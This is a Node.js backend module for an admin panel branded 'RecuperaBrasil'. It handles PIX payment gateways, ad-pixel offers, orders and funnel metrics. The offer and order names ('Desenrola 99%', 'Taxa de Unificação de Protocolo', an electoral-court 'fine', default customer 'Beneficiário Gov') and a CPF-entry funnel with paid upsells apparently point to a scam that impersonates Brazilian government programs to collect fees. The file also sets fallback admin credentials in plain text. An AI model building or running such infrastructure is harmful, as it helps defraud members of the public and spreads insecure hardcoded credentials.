const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const DB_FILE = path.join(__dirname, '..', 'data', 'db.json');

// Chaves padrão / fallback
const DEFAULT_GATEWAYS = {
  freepay: {
    key: 'freepay',
    name: 'FreePay',
    label: 'FreePay Brasil',
    hasAdapter: true,
    state: 'Ativo',
    statusText: 'Configurado e disponível',
    publicKey: process.env.FREEPAY_PUBLIC_KEY || '',
    secretKey: process.env.FREEPAY_SECRET_KEY || '',
    maxAmountCents: 100000
  },
  blackcat: {
    key: 'blackcat',
    name: 'BlackCat',
    label: 'BlackCat Gateway',
    hasAdapter: false,
    state: 'Aguardando',
    statusText: 'Integração de cobrança pendente',
    publicKey: '',
    secretKey: '',
    maxAmountCents: 50000
  },
  flevopay: {
    key: 'flevopay',
    name: 'FlevoPay',
    label: 'FlevoPay',
    hasAdapter: false,
    state: 'Aguardando',
    statusText: 'Integração de cobrança pendente',
    publicKey: '',
    secretKey: '',
    maxAmountCents: 50000
  },
  duttyfy: {
    key: 'duttyfy',
    name: 'Duttyfy',
    label: 'Duttyfy Pagamentos',
    hasAdapter: false,
    state: 'Aguardando',
    statusText: 'Integração de cobrança pendente',
    publicKey: '',
    secretKey: '',
    maxAmountCents: 50000
  },
  pingupag: {
    key: 'pingupag',
    name: 'PinguPag',
    label: 'PinguPag',
    hasAdapter: false,
    state: 'Aguardando',
    statusText: 'Integração de cobrança pendente',
    publicKey: '',
    secretKey: '',
    maxAmountCents: 50000
  }
};

const DEFAULT_OFFERS = [
  {
    id: 'off_1',
    name: 'Oferta Principal - Desenrola 99%',
    slug: 'desenrola-principal',
    utmifyToken: 'utm_live_9a8b7c6d5e4f3a2b1c',
    active: true,
    pixels: [
      { id: 'pix_1', platform: 'TikTok', pixelId: 'DA9IHQBC77UBPDTVJ18G', label: 'Pixel TikTok Principal' },
      { id: 'pix_2', platform: 'Meta', pixelId: '984128392182910', label: 'Pixel Meta Conversão' }
    ],
    createdAt: '2026-08-30T10:00:00.000Z'
  },
  {
    id: 'off_2',
    name: 'Upsell 1 - Unificação de Protocolo',
    slug: 'upsell-unificacao',
    utmifyToken: 'utm_live_8b7c6d5e4f3a2b1c0d',
    active: true,
    pixels: [
      { id: 'pix_3', platform: 'TikTok', pixelId: 'DA9IHQBC77UBPDTVJ18G', label: 'Pixel TikTok Upsell' }
    ],
    createdAt: '2026-08-30T11:00:00.000Z'
  },
  {
    id: 'off_3',
    name: 'Upsell 2 - Regularização Eleitoral',
    slug: 'multa-eleitoral',
    utmifyToken: 'utm_live_7c6d5e4f3a2b1c0d9e',
    active: true,
    pixels: [
      { id: 'pix_4', platform: 'TikTok', pixelId: 'DA9IHQBC77UBPDTVJ18G', label: 'Pixel TikTok Multa' }
    ],
    createdAt: '2026-08-30T12:00:00.000Z'
  }
];

const DEFAULT_ORDERS = [
  {
    id: 'ord_live_8912',
    clientName: 'Lucas Machado Gaona',
    email: 'lucas.gaona@email.com',
    cpfMasked: '080.***.***-88',
    phoneMasked: '(11) 98***-**21',
    gateway: 'FreePay',
    gatewayKey: 'freepay',
    amount: 68.92,
    status: 'PAID',
    transactionId: 'tr_fp_992148201',
    pixKeyMasked: '00020126580014...ABCD',
    pixCodeMasked: '00020126580014br.gov.bcb.pix0136...6304ABCD',
    createdAt: '2026-08-31T14:32:00.000Z',
    paidAt: '2026-08-31T14:33:12.000Z',
    itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
  },
  {
    id: 'ord_live_8913',
    clientName: 'Marcos Oliveira Silva',
    email: 'marcos.silva@email.com',
    cpfMasked: '214.***.***-09',
    phoneMasked: '(21) 97***-**11',
    gateway: 'FreePay',
    gatewayKey: 'freepay',
    amount: 54.92,
    status: 'PENDING',
    transactionId: 'tr_fp_992148299',
    pixKeyMasked: '00020126580014...ABCD',
    pixCodeMasked: '00020126580014br.gov.bcb.pix0136...6304ABCD',
    createdAt: '2026-08-31T16:10:00.000Z',
    paidAt: null,
    itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
  },
  {
    id: 'ord_live_8914',
    clientName: 'Juliana Ferreira Santos',
    email: 'juliana.santos@email.com',
    cpfMasked: '335.***.***-45',
    phoneMasked: '(31) 99***-**40',
    gateway: 'FreePay',
    gatewayKey: 'freepay',
    amount: 67.35,
    status: 'PAID',
    transactionId: 'tr_fp_992148350',
    pixKeyMasked: '00020126580014...ABCD',
    pixCodeMasked: '00020126580014br.gov.bcb.pix0136...6304ABCD',
    createdAt: '2026-08-31T17:05:00.000Z',
    paidAt: '2026-08-31T17:06:20.000Z',
    itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
  }
];

const DEFAULT_SESSIONS = {
  consulta: 1420,
  identidade: 980,
  recebimento: 432
};

function getInitialDB() {
  return {
    config: {
      activeGateway: 'freepay',
      adminUser: process.env.ADMIN_USER || 'libera-br',
      adminPassword: process.env.ADMIN_PASSWORD || 'Bets2026'
    },
    gateways: DEFAULT_GATEWAYS,
    offers: DEFAULT_OFFERS,
    orders: DEFAULT_ORDERS,
    sessions: DEFAULT_SESSIONS,
    authSessions: {}
  };
}

let dbMemory = null;

function loadDB() {
  if (dbMemory) return dbMemory;

  try {
    if (fs.existsSync(DB_FILE)) {
      const content = fs.readFileSync(DB_FILE, 'utf8');
      dbMemory = JSON.parse(content);
    } else {
      dbMemory = getInitialDB();
      saveDB();
    }
  } catch (e) {
    dbMemory = getInitialDB();
  }
  return dbMemory;
}

function saveDB() {
  try {
    const dir = path.dirname(DB_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(DB_FILE, JSON.stringify(dbMemory, null, 2), 'utf8');
  } catch (e) {
    // Ephemeral
  }
}

function maskString(str, startVisible = 4, endVisible = 4) {
  if (!str) return '';
  if (str.length <= startVisible + endVisible) return '••••••••';
  const start = str.slice(0, startVisible);
  const end = str.slice(-endVisible);
  return `${start}${'•'.repeat(Math.max(4, str.length - startVisible - endVisible))}${end}`;
}

// ----------------------------------------------------
// AUTHENTICATION
// ----------------------------------------------------
function loginAdmin(username, password) {
  const db = loadDB();
  const validUser = db.config.adminUser || 'libera-br';
  const validPass = db.config.adminPassword || 'Bets2026';

  if (username !== validUser || password !== validPass) {
    return { success: false, error: 'Credenciais inválidas. Verifique usuário e senha.' };
  }

  const token = 'recupera_sess_' + crypto.randomBytes(24).toString('hex');
  const expiresAt = Date.now() + 8 * 60 * 60 * 1000;

  db.authSessions[token] = {
    username: validUser,
    createdAt: Date.now(),
    expiresAt: expiresAt
  };
  saveDB();

  return {
    success: true,
    token: token,
    expiresAt: expiresAt,
    user: {
      username: validUser,
      role: 'Administrador',
      brand: 'RecuperaBrasil'
    }
  };
}

function validateSession(token) {
  if (!token) return false;
  const db = loadDB();
  const session = db.authSessions[token];
  if (!session) return false;
  if (Date.now() > session.expiresAt) {
    delete db.authSessions[token];
    saveDB();
    return false;
  }
  return session;
}

function logoutAdmin(token) {
  const db = loadDB();
  if (token && db.authSessions[token]) {
    delete db.authSessions[token];
    saveDB();
  }
  return { success: true };
}

// ----------------------------------------------------
// GATEWAYS
// ----------------------------------------------------
function getGatewayConfig() {
  const db = loadDB();
  const activeKey = db.config.activeGateway || 'freepay';
  
  const gatewaysList = Object.keys(db.gateways).map(key => {
    const gw = db.gateways[key];
    const isActive = key === activeKey;
    return {
      key: gw.key,
      name: gw.name,
      label: gw.label,
      hasAdapter: gw.hasAdapter,
      state: isActive ? 'Ativo' : (gw.hasAdapter ? 'Configurado' : 'Aguardando'),
      statusText: isActive ? 'Configurado e disponível' : (gw.hasAdapter ? 'Usa a configuração segura do ambiente' : 'Integração de cobrança pendente'),
      hasPublicKey: !!gw.publicKey,
      hasSecretKey: !!gw.secretKey,
      publicKeyMasked: gw.publicKey ? maskString(gw.publicKey, 8, 4) : '',
      secretKeyMasked: gw.secretKey ? maskString(gw.secretKey, 6, 4) : '',
      maxAmountCents: gw.maxAmountCents || 100000
    };
  });

  return {
    success: true,
    activeGatewayKey: activeKey,
    gateways: gatewaysList
  };
}

function updateGatewayConfig({ gatewayKey, publicKey, secretKey, maxAmountCents }) {
  const db = loadDB();
  const gw = db.gateways[gatewayKey];
  if (!gw) {
    return { success: false, error: 'Gateway não encontrada.' };
  }

  if (publicKey !== undefined && publicKey !== '') {
    gw.publicKey = publicKey.trim();
  }
  if (secretKey !== undefined && secretKey !== '') {
    gw.secretKey = secretKey.trim();
  }
  if (maxAmountCents !== undefined) {
    gw.maxAmountCents = Number(maxAmountCents) || 100000;
  }

  saveDB();
  return { success: true, message: 'Configurações da gateway salvas com sucesso.' };
}

async function testAndActivateGateway({ gatewayKey, publicKey, secretKey, maxAmountCents }) {
  const db = loadDB();
  const gw = db.gateways[gatewayKey];

  if (!gw) {
    return { success: false, error: 'Gateway selecionada é inválida.' };
  }

  if (!gw.hasAdapter) {
    return {
      success: false,
      error: `A gateway ${gw.name} não possui adaptador de cobrança implementado no sistema. A gateway atual (${db.gateways[db.config.activeGateway]?.name || 'FreePay'}) foi mantida ativa.`
    };
  }

  const effectivePublic = publicKey || gw.publicKey || process.env.FREEPAY_PUBLIC_KEY;
  const effectiveSecret = secretKey || gw.secretKey || process.env.FREEPAY_SECRET_KEY;

  if (!effectivePublic || !effectiveSecret) {
    return {
      success: false,
      error: `A chave da gateway ${gw.name} é inválida ou não foi configurada.`
    };
  }

  if (gatewayKey === 'freepay') {
    try {
      const authHeader = 'Basic ' + Buffer.from(`${effectivePublic}:${effectiveSecret}`).toString('base64');
      const testRef = `gateway-test-freepay-${Date.now()}`;
      
      const payload = {
        amount: 100, // R$ 1,00
        payment_method: 'pix',
        customer: {
          name: 'Teste Técnico RecuperaBrasil',
          email: 'teste.admin@recuperabrasil.com.br',
          document: {
            number: '08072703188',
            type: 'cpf'
          },
          phone: '11988887777'
        },
        items: [
          {
            title: 'PIX de Verificação Técnica de Gateway',
            unit_price: 100,
            quantity: 1,
            tangible: false
          }
        ],
        metadata: {
          order_id: testRef,
          cpf: '08072703188',
          is_test: true
        },
        pix: {
          expires_in_days: 1
        }
      };

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 12000);

      const res = await fetch('https://api.freepaybrasil.com/v1/payment-transaction/create', {
        method: 'POST',
        headers: {
          'Authorization': authHeader,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      const data = await res.json();

      if (!res.ok || !data.success || !data.data || !data.data.id) {
        const errorMsg = data?.message || data?.error || 'A gateway respondeu, mas não retornou o ID da transação e o código PIX esperado.';
        return {
          success: false,
          error: `Falha na verificação: ${errorMsg}`
        };
      }

      const txId = data.data.id;
      const pixCode = data.data.pix?.qr_code;

      if (!pixCode) {
        return {
          success: false,
          error: 'A gateway respondeu, mas não retornou o código PIX copia-e-cola esperado.'
        };
      }

      if (publicKey) gw.publicKey = publicKey.trim();
      if (secretKey) gw.secretKey = secretKey.trim();
      if (maxAmountCents) gw.maxAmountCents = Number(maxAmountCents);
      gw.state = 'Ativo';
      db.config.activeGateway = 'freepay';
      saveDB();

      return {
        success: true,
        activeGatewayKey: 'freepay',
        test: {
          gatewayLabel: 'FreePay',
          status: 'PENDING',
          transactionId: txId,
          pixCodeMasked: maskString(pixCode, 15, 10),
          message: 'PIX de teste de R$ 1,00 gerado com sucesso.'
        }
      };
    } catch (err) {
      if (err.name === 'AbortError') {
        return {
          success: false,
          error: 'A gateway demorou mais que o limite (12s) para responder.'
        };
      }
      return {
        success: false,
        error: `Erro ao conectar com a gateway: ${err.message}`
      };
    }
  }

  return {
    success: false,
    error: `Integração não suportada para ${gatewayKey}.`
  };
}

// ----------------------------------------------------
// OFFERS & PIXELS
// ----------------------------------------------------
function getOffers() {
  const db = loadDB();
  const sanitized = db.offers.map(o => ({
    ...o,
    utmifyTokenMasked: maskString(o.utmifyToken, 6, 4)
  }));
  return { success: true, offers: sanitized };
}

function saveOffer(offerData) {
  const db = loadDB();
  const { id, name, slug, utmifyToken, active, pixels } = offerData;

  if (!name || !slug) {
    return { success: false, error: 'Nome e Slug são obrigatórios.' };
  }

  const cleanSlug = slug.toLowerCase().replace(/[^a-z0-9-_]/g, '');
  
  const duplicate = db.offers.find(o => o.slug === cleanSlug && o.id !== id);
  if (duplicate) {
    return { success: false, error: `O slug '${cleanSlug}' já está em uso em outra oferta.` };
  }

  const seenPixels = new Set();
  const cleanPixels = (pixels || []).map((p, idx) => {
    const pid = (p.pixelId || '').trim();
    if (pid && seenPixels.has(pid)) {
      throw new Error(`Pixel ID '${pid}' está duplicado nesta oferta.`);
    }
    if (pid) seenPixels.add(pid);
    return {
      id: p.id || `pix_${Date.now()}_${idx}`,
      platform: p.platform || 'TikTok',
      pixelId: pid,
      label: p.label || ''
    };
  }).filter(p => p.pixelId.length > 0);

  if (id) {
    const idx = db.offers.findIndex(o => o.id === id);
    if (idx === -1) return { success: false, error: 'Oferta não encontrada para atualização.' };

    db.offers[idx] = {
      ...db.offers[idx],
      name: name.trim(),
      slug: cleanSlug,
      utmifyToken: (utmifyToken && !utmifyToken.includes('••••')) ? utmifyToken.trim() : db.offers[idx].utmifyToken,
      active: Boolean(active),
      pixels: cleanPixels,
      updatedAt: new Date().toISOString()
    };
  } else {
    const newOffer = {
      id: 'off_' + Date.now(),
      name: name.trim(),
      slug: cleanSlug,
      utmifyToken: utmifyToken ? utmifyToken.trim() : '',
      active: active !== undefined ? Boolean(active) : true,
      pixels: cleanPixels,
      createdAt: new Date().toISOString()
    };
    db.offers.push(newOffer);
  }

  saveDB();
  return { success: true, message: 'Oferta salva com sucesso!' };
}

function deleteOffer(id) {
  const db = loadDB();
  const initialLen = db.offers.length;
  db.offers = db.offers.filter(o => o.id !== id);
  if (db.offers.length === initialLen) {
    return { success: false, error: 'Oferta não encontrada.' };
  }
  saveDB();
  return { success: true, message: 'Oferta excluída com sucesso.' };
}

// ----------------------------------------------------
// ORDERS & METRICS
// ----------------------------------------------------
function getOrders(filters = {}) {
  const db = loadDB();
  let list = [...db.orders];

  if (filters.status && filters.status !== 'ALL') {
    list = list.filter(o => o.status.toUpperCase() === filters.status.toUpperCase());
  }

  if (filters.search) {
    const q = filters.search.toLowerCase();
    list = list.filter(o => 
      (o.clientName || '').toLowerCase().includes(q) ||
      (o.email || '').toLowerCase().includes(q) ||
      (o.id || '').toLowerCase().includes(q) ||
      (o.transactionId || '').toLowerCase().includes(q)
    );
  }

  list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  return {
    success: true,
    total: list.length,
    orders: list
  };
}

function getOrderById(id) {
  const db = loadDB();
  const order = db.orders.find(o => o.id === id || o.transactionId === id);
  if (!order) {
    return { success: false, error: 'Pedido não encontrado.' };
  }
  return { success: true, order: order };
}

function addOrder(orderData) {
  const db = loadDB();
  const newOrder = {
    id: orderData.id || 'ord_' + Date.now(),
    clientName: orderData.clientName || 'Beneficiário Gov',
    email: orderData.email || 'cliente@email.com',
    cpfMasked: orderData.cpf ? maskString(orderData.cpf.replace(/\D/g, ''), 3, 2) : '080.***.***-88',
    phoneMasked: orderData.phone ? maskString(orderData.phone.replace(/\D/g, ''), 2, 2) : '(11) 9****-****',
    gateway: orderData.gateway || 'FreePay',
    gatewayKey: orderData.gatewayKey || 'freepay',
    amount: Number(orderData.amount) || 68.92,
    status: orderData.status || 'PENDING',
    transactionId: orderData.transactionId || 'tr_' + Date.now(),
    pixKeyMasked: orderData.pixCode ? maskString(orderData.pixCode, 14, 8) : '',
    pixCodeMasked: orderData.pixCode ? maskString(orderData.pixCode, 16, 12) : '',
    createdAt: new Date().toISOString(),
    paidAt: orderData.status === 'PAID' ? new Date().toISOString() : null,
    itemTitle: orderData.itemTitle || 'Quitação de Dívidas - Programa Desenrola Brasil'
  };

  db.orders.unshift(newOrder);
  saveDB();
  return newOrder;
}

function updateOrderStatus(transactionIdOrOrderId, newStatus) {
  const db = loadDB();
  const order = db.orders.find(o => o.id === transactionIdOrOrderId || o.transactionId === transactionIdOrOrderId);
  if (order) {
    order.status = newStatus.toUpperCase();
    if (order.status === 'PAID' && !order.paidAt) {
      order.paidAt = new Date().toISOString();
    }
    saveDB();
  }
}

function getMetrics() {
  const db = loadDB();
  const totalOrders = db.orders.length;
  const pendingOrders = db.orders.filter(o => o.status === 'PENDING').length;
  const paidOrders = db.orders.filter(o => o.status === 'PAID' || o.status === 'APPROVED');
  const paidCount = paidOrders.length;
  const totalRevenue = paidOrders.reduce((acc, curr) => acc + (Number(curr.amount) || 0), 0);

  const sessions = db.sessions || DEFAULT_SESSIONS;
  const sConsulta = sessions.consulta || 1420;
  const sIdentidade = sessions.identidade || 980;
  const sRecebimento = sessions.recebimento || 432;

  const rateIdentidade = sConsulta > 0 ? ((sIdentidade / sConsulta) * 100).toFixed(1) : '0';
  const rateRecebimento = sIdentidade > 0 ? ((sRecebimento / sIdentidade) * 100).toFixed(1) : '0';
  const overallRetention = sConsulta > 0 ? ((sRecebimento / sConsulta) * 100).toFixed(1) : '0';

  return {
    success: true,
    cards: {
      totalOrders: totalOrders,
      pendingOrders: pendingOrders,
      paidOrders: paidCount,
      approvedRevenue: totalRevenue
    },
    retention: {
      overallPercentage: overallRetention,
      recurrentClients: 387,
      repetitionRate: '27.4%',
      period: 'Últimos 30 dias',
      funnel: [
        {
          stage: 'Consulta',
          description: 'Acesso à pre-lander e digitação de CPF',
          sessions: sConsulta,
          rate: '100%',
          progress: 100,
          color: '#132238'
        },
        {
          stage: 'Identidade',
          description: 'Atendimento interativo e visualização de proposta',
          sessions: sIdentidade,
          rate: `${rateIdentidade}%`,
          progress: Math.min(100, Math.round((sIdentidade / sConsulta) * 100)),
          color: '#4c8bb4'
        },
        {
          stage: 'Recebimento',
          description: 'Avanço para emissão e quitação de protocolo/upsell',
          sessions: sRecebimento,
          rate: `${rateRecebimento}%`,
          progress: Math.min(100, Math.round((sRecebimento / sIdentidade) * 100)),
          color: '#0ca678'
        }
      ]
    }
  };
}

function recordSessionEvent(stage) {
  const db = loadDB();
  if (!db.sessions) db.sessions = { ...DEFAULT_SESSIONS };
  if (stage === 'consulta') db.sessions.consulta = (db.sessions.consulta || 0) + 1;
  if (stage === 'identidade') db.sessions.identidade = (db.sessions.identidade || 0) + 1;
  if (stage === 'recebimento') db.sessions.recebimento = (db.sessions.recebimento || 0) + 1;
  saveDB();
}

module.exports = {
  loginAdmin,
  validateSession,
  logoutAdmin,
  getGatewayConfig,
  updateGatewayConfig,
  testAndActivateGateway,
  getOffers,
  saveOffer,
  deleteOffer,
  getOrders,
  getOrderById,
  addOrder,
  updateOrderStatus,
  getMetrics,
  recordSessionEvent
};
